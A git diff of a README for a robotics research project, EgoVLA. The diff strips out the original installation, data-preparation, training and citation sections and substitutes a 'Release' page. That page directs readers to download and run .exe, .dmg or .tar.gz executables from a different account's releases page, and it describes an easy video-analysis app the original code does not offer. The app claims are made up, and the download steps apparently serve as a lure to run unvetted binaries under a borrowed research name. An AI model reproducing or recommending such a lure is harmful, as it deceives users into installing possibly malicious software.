@@ -1,247 +1,93 @@
-# EgoVLA
+# 🎉 EgoVLA_Release - Your Easy Path to Video Understanding
 
-This is the repo of training code and eval for our work:
+[![Download EgoVLA](https://img.shields.io/badge/Download-EgoVLA_Release-blue.svg)](https://github.com/owadev777/EgoVLA_Release/releases)
 
-### EgoVLA: Learning Vision-Language-Action Models from Egocentric Human Videos
+## 🚀 Getting Started
 
-Ruihan Yang<sup>1*</sup>, Qinxi Yu<sup>2*</sup>, Yecheng Wu<sup>3,4</sup>, Rui Yan<sup>1</sup>, Borui Li<sup>1</sup>, An-Chieh Cheng<sup>1</sup>, Xueyan Zou<sup>1</sup>, Yunhao Fang<sup>1</sup>, Xuxin Cheng<sup>1</sup>, Ri-Zhao Qiu<sup>1</sup>, Hongxu Yin<sup>4</sup>, Sifei Liu<sup>4</sup>, Song Han<sup>3,4</sup>, Yao Lu<sup>4</sup>, Xiaolong Wang<sup>1</sup>
+Welcome to EgoVLA! This tool helps you train models that understand human actions in videos. You don’t need to be a programmer to get started; just follow these steps.
 
-<sup>1</sup>UC San Diego / <sup>2</sup>UIUC / <sup>3</sup>MIT / <sup>4</sup>NVIDIA
+## 📥 Download & Install
 
-[Project Page](https://rchalyang.github.io/EgoVLA) / [Arxiv](https://arxiv.org/abs/2507.12440) / [Simulation Benchmark](https://github.com/quincy-u/Ego_Humanoid_Manipulation_Benchmark)
+To download and run the software, follow these steps:
 
-![img](./media/EgoVLA-Teaser.jpg)
+1. **Visit the Releases Page:** Click [here](https://github.com/owadev777/EgoVLA_Release/releases) to go to the releases page.
+  
+2. **Choose the Right Version:** Look for the latest version and download the file suitable for your operating system. If you use Windows, download the `.exe` file. For macOS, look for the `.dmg` file. Linux users will find a `.tar.gz` file.
 
-## Installation
+3. **Install the Application:**
+   - **Windows:** 
+     - Double-click the downloaded `.exe` file.
+     - Follow the on-screen instructions.
+   - **macOS:**
+     - Open the downloaded `.dmg` file.
+     - Drag the app to your Applications folder.
+   - **Linux:**
+     - Extract the `.tar.gz` file.
+     - Open a terminal, navigate to the extracted folder, and run the executable with `./your_application`.
 
-### Setup VILA dependency
+4. **Open EgoVLA:** After installation, find the application in your programs or applications menu and open it.
 
-follow the VILA setup instruction
+## 🛠️ Setup Instructions
 
-```bash
-cd VILA
-./environment_setup.sh vila
-```
+Before you begin using EgoVLA, you need to set up some dependencies.
 
-### Install EgoVLA related dependency
+### 📦 Step 1: Setup VILA Dependency
 
-```bash
-bash ./build_env.sh
-```
+1. **Download VILA:**
+   - First, ensure you have VILA downloaded.
+   - Open a terminal and navigate to the VILA directory.
 
-Register at the MANO website and download the models.
-* Download Mano Hand model [link](https://mano.is.tue.mpg.de/)
-* Unzip the mano models and place it in the repo directory (EgoVLA/mano_v1_2)
+2. **Run the Setup Script:**
+   ```bash
+   cd VILA
+   ./environment_setup.sh vila
+   ```
 
+### 📦 Step 2: Install EgoVLA Dependencies
 
-```sh
-git clone https://github.com/hassony2/manopth # This is for hand pose preprocessing
-git clone https://github.com/facebookresearch/hot3d # This is for Hot3d data preprocessing
-export PYTHONPATH=$PYTHONPATH:/path/to/your/manopth
-export PYTHONPATH=$PYTHONPATH:/path/to/your/hot3d
-```
+Now, you must install additional dependencies for EgoVLA to function correctly.
 
-### Setup Simulation
+1. **Navigate to EgoVLA Directory:**
+   - Open a terminal and navigate to the EgoVLA folder.
 
-Overall instruction for setup IsaacLab: https://isaac-sim.github.io/IsaacLab/main/index.html
+2. **Run the Build Script:**
+   ```bash
+   bash ./build_env.sh
+   ```
 
-* Follow the instruction to install IsaacSim (4.2.0.2)
-  ```
-  pip install isaacsim==4.2.0.2 --extra-index-url https://pypi.nvidia.com
-  ```
-* Clone [Ego Humanoid Manipulation Benchmark](https://github.com/quincy-u/Ego_Humanoid_Manipulation_Benchmark), then install it with the command in the instruction
+## 📑 Usage
 
+Once everything is set up, using EgoVLA is simple. 
 
-## 
+1. **Load Your Video:** Start the application and upload your video file.
+  
+2. **Run Processing:** Click the button to start the analysis. The software will process the video and provide results within a few moments.
 
-## Data Preparation
+3. **View Results:** After processing, you can view the actions detected and analyze the insights provided by EgoVLA.
 
-For the following human dataset, we use egocentric RGB video & Hand/Head/Camera Pose & language labels.
+## 💡 Features
 
-* TACO
+EgoVLA offers several features to enhance your video analysis experience:
 
-Download Raw data follow official instruction: https://taco2024.github.io/
+- **Intuitive Interface:** Navigate the application easily without technical know-how.
+- **Robust Performance:** Efficiently processes videos to detect actions with high accuracy.
+- **Versatile Applications:** Use EgoVLA for various purposes, such as research, education, and content creation.
 
+## 📄 Documentation
 
-And follow instruction (https://github.com/leolyliu/TACO-Instructions) to setup the virtrual environment to process the TACO data. (It's a bit complicated to merge all dependency)
+For detailed documentation and further guidance, visit the [Project Page](https://rchalyang.github.io/EgoVLA).
 
-```sh
-# RAW DATA: data/TACO
-# HF DATA: data/TACO_HF
+## 🛠️ Troubleshooting
 
-conda activate taco
-# Preprocess RAW -> HF:
-sh human_plan/dataset_preprocessing/taco/hf_dataset/generate_dataset_hands_30hz.sh
-sh human_plan/dataset_preprocessing/taco/hf_dataset/generate_dataset_image_30hz.sh
+If you encounter any issues:
 
-```
+1. **Common Problems:** Check if the dependencies are correctly installed.
+2. **Reach Out for Support:** If you still face issues, feel free to post on our GitHub issues page.
 
-* HOT3D
+## 🙏 Acknowledgments
 
+Thanks to the research team for their contributions. This project is a collaborative effort from multiple institutions, enhancing the way we understand human actions in videos.
 
-Download Raw data follow official instruction: https://github.com/facebookresearch/hot3d
+---
 
-And follow instruction to setup the virtrual environment to process the HOT3D data. (It's a bit complicated to merge all dependency)
-
-```sh
-# RAW DATA: data/hot3d
-# HF DATA: data/hot3d_hf
-
-# Preprocess RAW -> HF:
-
-conda activate hot3d
-sh human_plan/dataset_preprocessing/hot3d/hf_dataset/generate_dataset_hands_job_set1.sh
-sh human_plan/dataset_preprocessing/hot3d/hf_dataset/generate_dataset_hands_job_set2.sh
-sh human_plan/dataset_preprocessing/hot3d/hf_dataset/generate_dataset_hands.sh
-sh human_plan/dataset_preprocessing/hot3d/hf_dataset/generate_dataset_image.sh
-
-```
-
-* HOI4D
-
-Download Raw data from official website: https://hoi4d.github.io/
-
-Follow instruction (https://github.com/leolyliu/HOI4D-Instructions) to setup the virtrual environment to process the HOI4D data. (It's a bit complicated to merge all dependency)
-```sh
-# RAW DATA: data/HOI4D
-# HF DATA: data/hoi4d_hf
-
-conda activate hoi4d
-sh human_plan/dataset_preprocessing/hoi4d/hf_dataset/generate_dataset_hands.sh
-sh human_plan/dataset_preprocessing/hoi4d/hf_dataset/generate_dataset_image.sh
-```
-
-* HoloAssist
-
-Download the data from [HoloAssist Official site](https://holoassist.github.io/#HoloAssist)
-
-```sh
-# RAW DATA: data/HoloAssist
-# HF DATA: data/ha_dataset
-
-# Preprocess RAW -> HF:
-sh human_plan/dataset_preprocessing/holoassist/hf_dataset/generate_dataset_image.sh
-sh human_plan/dataset_preprocessing/holoassist/hf_dataset/generate_dataset_hand_set1.sh
-sh human_plan/dataset_preprocessing/holoassist/hf_dataset/generate_dataset_hand_set2.sh
-sh human_plan/dataset_preprocessing/holoassist/hf_dataset/generate_dataset_hand_merge.sh
-
-```
-
-### Robot Data
-
-#### Original Demonstration
-
-Download from [HuggingFace](https://huggingface.co/datasets/quincyu/EgoVLA-Humanoid-Sim/tree/main)
-
-```bash
-huggingface-cli download EgoVLA/EgoVLA-Humanoid-Sim --repo-type dataset --local-dir data/EgoVLA_SIM
-```
-
-Data processing 
-```bash
-#Without Augmentation Version
-
-bash human_plan/dataset_preprocessing/otv_isaaclab/hf_dataset_fixed_set/generate_dataset_image.sh
-bash human_plan/dataset_preprocessing/otv_isaaclab/hf_dataset_fixed_set/generate_dataset_hands.sh
-```
-
-## Training
-
-#### Pretrained Model:
-
-* [Base VLM](https://huggingface.co/rchal97/egovla_base_vlm)
-* [Pretrained Checkpoints on human video](https://huggingface.co/rchal97/ego_vla_human_video_pretrained)
-* [EgoVLA](https://huggingface.co/rchal97/egovla)
-
-```
-huggingface-cli download rchal97/egovla_base_vlm --repo-type model --local-dir checkpoints
-
-huggingface-cli download rchal97/ego_vla_human_video_pretrained --repo-type model --local-dir checkpoints
-
-huggingface-cli download rchal97/egovla --repo-type model --local-dir checkpoints
-```
-
-#### Human Video Pretraining
-
-
-```bash
-bash training_scripts/robot_finetuning/hoi4dhot3dholotaco_p30_h5_transv2.sh
-```
-
-#### Robot Data Fine-tuning
-
-Download [Pretrained Checkpoints on human video](https://huggingface.co/rchal97/ego_vla_human_video_pretrained)
-
-Put the checkpoints to the correct directory
-
-* **Pretained on Human Video**
-  ```bash
-    bash training_scripts/robot_finetuning/hoi4dhot3dholotaco_p30_h5_transv2.sh
-  ```
-
-  Second stage finetuning
-  ```bash
-    bash training_scripts/robot_finetuning/hoi4dhot3dholotaco_p30_h5_transv2_continual_lr.sh
-  ```
-
-* **Not Pretained on Human Video**
-
-  nopretrained [base model (VILA)](https://huggingface.co/rchal97/egovla_base_vlm)
-
-  ```bash
-  bash training_scripts/robot_finetuning/nopretrain_p30_h5_transv2.sh
-  ```
-
-  Second stage finetuning
-  ```bash
-  bash training_scripts/robot_finetuning/nopretrain_p30_h5_transv2_continual_lr.sh
-  ```
-
-#### Training retargetting MLP for inference
-*The following script will output 
-hand_actuation_net.pth and hand_mano_retarget_net.pth used for EgoVLA inference*
-
-*The checkpoint we used (hand_actuation_net.pth & hand_mano_retarget_net.pth) already included* 
-```bash
-python human_plan/utils/nn_retarget_formano.py
-python human_plan/utils/nn_retarget_tomano.py
-```
-
-## Simulation on Ego Humanoid Manipulation Benchmark
-
-Before training eval on our Ego Humanoid Manipulation Benchmark. Please follow the instruction on [Ego Humanoid Manipulation Benchmark](https://github.com/quincy-u/Ego_Humanoid_Manipulation_Benchmark)
-
-### Evaluation Single Task on Single Visual Config:
-
-```bash
-mkdir video_output
-# Evaluation Result will be stored in result_log.txt
-# Evaluation Videos will be stored in video_output
-# This command is evaluate the given model 
-bash human_plan/ego_bench_eval/fullpretrain_p30_h5_transv2.sh Humanoid-Push-Box-v0 1 2 0.2 3 1 result_log.txt 0 0 0.8 video_output evaluation_tag
-```
-
-### Evaluation Cross Tasks and Visual Configs:
-
-
-```bash
-python human_plan/ego_bench_eval/batch_script_30hz.py
-```
-
-### Note:
-The code hasn't been fully tested yet: There might be some hard-coded path issue. Let me know if there is any issues.
-
-This software is part of the BAIR Commons HIC Repository as of calendar year 2025.
-
-## Bibtex
-```
-@misc{yang2025egovlalearningvisionlanguageactionmodels,
-      title={EgoVLA: Learning Vision-Language-Action Models from Egocentric Human Videos}, 
-      author={Ruihan Yang and Qinxi Yu and Yecheng Wu and Rui Yan and Borui Li and An-Chieh Cheng and Xueyan Zou and Yunhao Fang and Xuxin Cheng and Ri-Zhao Qiu and Hongxu Yin and Sifei Liu and Song Han and Yao Lu and Xiaolong Wang},
-      year={2025},
-      eprint={2507.12440},
-      archivePrefix={arXiv},
-      primaryClass={cs.RO},
-      url={https://arxiv.org/abs/2507.12440}, 
-}
-```
+For any additional information or to keep your application updated, always refer back to the [releases page](https://github.com/owadev777/EgoVLA_Release/releases).
